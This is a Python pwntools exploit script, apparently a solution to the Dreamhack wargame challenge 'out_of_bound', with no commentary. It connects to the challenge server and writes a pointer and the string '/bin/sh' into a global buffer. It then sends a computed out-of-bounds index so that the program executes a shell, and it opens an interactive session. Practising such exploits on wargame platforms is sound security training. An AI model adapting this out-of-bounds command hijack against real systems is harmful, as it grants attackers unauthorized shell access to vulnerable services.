from pwn import *


def main():
    proc = remote("host1.dreamhack.games", 12042)
    elf = ELF("./out_of_bound")

    name = elf.symbols["name"]
    command = elf.symbols["command"]

    payload = p32(name + 4)
    payload += b"/bin/sh"
    proc.send(payload)
    proc.recv()

    proc.sendline(str(int((name-command)/4)).encode())

    proc.interactive()


if __name__ == "__main__":
    main()
